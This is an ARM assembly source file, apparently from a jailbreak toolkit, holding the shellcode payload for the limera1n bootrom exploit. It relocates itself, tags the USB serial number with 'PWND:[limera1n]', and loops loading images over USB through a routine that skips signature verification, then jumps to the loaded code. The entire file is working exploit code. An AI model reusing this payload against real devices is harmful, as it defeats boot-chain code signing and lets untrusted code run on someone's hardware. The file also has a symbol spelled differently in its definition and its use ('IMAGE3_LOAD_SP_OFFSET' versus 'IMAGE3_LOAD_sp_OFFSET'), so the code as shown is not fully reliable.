@ limera1n-shellcode.S
@ Author: axi0mX
@ Shellcode for limera1n exploit with minor improvements:
@ * reports PWND:[limera1n] in USB serial number string

.text

.pool
.set free,                          0xBAD0000d
.set memz_create,                   0xBAD0000e
.set memz_destroy,                  0xBAD00010
.set image3_create_struct,          0xBAD00013
.set image3_load_continue,          0xBAD00014
.set image3_load_fail,              0xBAD00015
.set usb_wait_for_image,            0xBAD00009
.set jump_to,                       0xBAD0000f
.set nor_power_on,                  0xBAD00005
.set nor_init,                      0xBAD00006
.set memmove,                       0xBAD00003
.set strlcat,                       0xBAD00008

.set gLeakingDFUBuffer,             0xBAD0000c
.set gUSBSerialNumber,              0xBAD00007

.set RELOCATE_SHELLCODE_ADDRESS,    0xBAD00001
.set RELOCATE_SHELLCODE_SIZE,       0xBAD00002
.set MAIN_STACK_ADDRESS,            0xBAD00004
.set LOAD_ADDRESS,                  0xBAD0000a
.set MAX_SIZE,                      0xBAD0000b
.set IMAGE3_LOAD_SP_OFFSET,         0xBAD00011
.set IMAGE3_LOAD_STRUCT_OFFSET,     0xBAD00012

.global _start

_start:
.code 16
    b       _relocate_shellcode                 @ goto _relocate_shellcode

    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

_relocate_shellcode:
    mov     r1, pc
    sub     r1, r1, #4                          @ r1 = pc - 4

    ldr     r0, =RELOCATE_SHELLCODE_ADDRESS
    cmp     r0, r1
    beq     _pwned_dfu_start                    @ if (r1 == RELOCATE_SHELLCODE_ADDRESS) goto _pwned_dfu_start

    ldr     r2, =RELOCATE_SHELLCODE_SIZE
    ldr     r3, =memmove
    blx     r3                                  @ memmove(RELOCATE_SHELLCODE_ADDRESS, r1, RELOCATE_SHELLCODE_SIZE)

    ldr     r3, =RELOCATE_SHELLCODE_ADDRESS
    add     r3, r3, #1
    bx      r3                                  @ goto (RELOCATE_SHELLCODE_ADDRESS + 1)

_pwned_dfu_start:
    ldr     r0, =MAIN_STACK_ADDRESS
    mov     sp, r0                              @ sp = MAIN_STACK_ADDRESS

    mov     r0, #1
    mov     r1, #1
    mov     r2, #0
    ldr     r3, =nor_power_on
    blx     r3                                  @ nor_power_on(1, 1, 0)

    mov     r0, #0
    ldr     r3, =nor_init
    blx     r3                                  @ nor_init(0)

    ldr     r0, =gUSBSerialNumber
    adr     r1, PWND_STRING
    mov     r2, #120
    ldr     r3, =strlcat
    blx     r3                                  @ strlcat(gUSBSerialNumber, PWND_STRING, 120)

_pwned_dfu_loop:
    ldr     r3, =usb_wait_for_image
    ldr     r0, =LOAD_ADDRESS
    ldr     r1, =MAX_SIZE
    blx     r3                                  @ r0 = usb_wait_for_image(LOAD_ADDRESS, MAX_SIZE)

    mov     r4, r0                              @ r4 = r0

    ldr     r1, =gLeakingDFUBuffer
    ldr     r0, [r1]                            @ r0 = gLeakingDFUBuffer

    mov     r2, #0
    str     r2, [r1]                            @ gLeakingDFUBuffer = 0

    ldr     r3, =free
    blx     r3                                  @ free(r0)

    cmp     r4, #0
    blt     _pwned_dfu_loop                     @ if (r4 < 0) goto _pwned_dfu_loop

    ldr     r5, =LOAD_ADDRESS
    b       _pwned_dfu_main                     @ goto _pwned_dfu_main

_pwned_dfu_main:
    ldr     r0, =LOAD_ADDRESS
    mov     r1, r4
    mov     r2, #0
    ldr     r3, =memz_create
    blx     r3                                  @ r0 = memz_create(LOAD_ADDRESS, r4, 0)

    cmp     r0, #0
    beq     _pwned_dfu_loop                     @ if (r0 == 0) goto _pwned_dfu_loop /* out of memory :-| */

    ldr     r3, =LOAD_ADDRESS
    str     r3, [sp]                            @ sp[0] = LOAD_ADDRESS

    str     r4, [sp, #4]                        @ sp[1] = r4

    mov     r4, r0                              @ r4 = r0

    mov     r1, sp
    add     r2, sp, #4
    bl      _image3_load_no_signature_check     @ r0 = _image3_load_no_signature_check(r0, &sp[0], &sp[1])

    cbnz    r0, _load_failed                    @ if (r0 != 0) goto _load_failed

    ldr     r1, =LOAD_ADDRESS
    mov     r2, #0
    ldr     r3, =jump_to
    blx     r3                                  @ jump_to(0, LOAD_ADDRESS, 0)

/* jump_to should never return */

_load_failed:
    mov     r0, r4
    ldr     r3, =memz_destroy
    blx     r3                                  @ memz_destroy(r4)

    b       _pwned_dfu_loop                     @ goto _pwned_dfu_loop

_image3_load_no_signature_check:
    push    {r4-r7, lr}                         @ push_registers(r4, r5, r6, R7, lr)

    mov     r6, r11
    mov     r5, r10
    mov     r4, r8
    push    {r4-r6}                             @ push_registers(r8, r10, r11)

    add     r7, sp, #0x18                       @ r7 = sp - 0x18

    ldr     r4, =IMAGE3_LOAD_sp_OFFSET
    mov     r5, sp
    sub     r5, r5, r4
    mov     sp, r5                              @ sp = sp - IMAGE3_LOAD_sp_OFFSET

    mov     r3, #0
    ldr     r4, =IMAGE3_LOAD_STRUCT_OFFSET
    add     r4, r5, r4
    str     r3, [r4]                            @ *(sp + IMAGE3_LOAD_STRUCT_OFFSET) = 0

    str     r2, [sp, #0x10]                     @ sp[4] = r2

    str     r1, [sp, #0x14]                     @ sp[5] = r1

    str     r3, [sp, #0x18]                     @ sp[6] = 0

    ldr     r6, [r1]                            @ r6 = *r1

    mov     r10, r1                             @ r10 = r1

    mov     r11, r3                             @ r11 = 0

    ldr     r1, =MAX_SIZE
    mov     r8, r1                              @ r8 = MAX_SIZE

    ldr     r2, [r0, #4]
    cmp     r2, r1
    bgt     _img3_fail                          @ if (r0[1] > MAX_SIZE) goto img3_fail

    mov     r8, r2                              @ r8 = r0[1]

    mov     r0, r4
    mov     r1, r6
    ldr     r4, =image3_create_struct
    blx     r4
    mov     r4, r0                              @ r4 = image3_create_struct(sp + IMAGE3_LOAD_STRUCT_OFFSET, r6, r8, 0)

    ldr     r3, =image3_load_continue           @ r3 = image3_load_continue

    cbz     r4, _img3_branch_r3                 @ if (r4 == 0) goto _img3_branch_r3

_img3_fail:
    mov     r4, #1                              @ r4 = 1

    ldr     r3, =image3_load_fail               @ r3 = image3_load_fail

_img3_branch_r3:
    bx      r3                                  @ goto r3

.align 2

PWND_STRING:
.ascii " PWND:[limera1n]\x00"
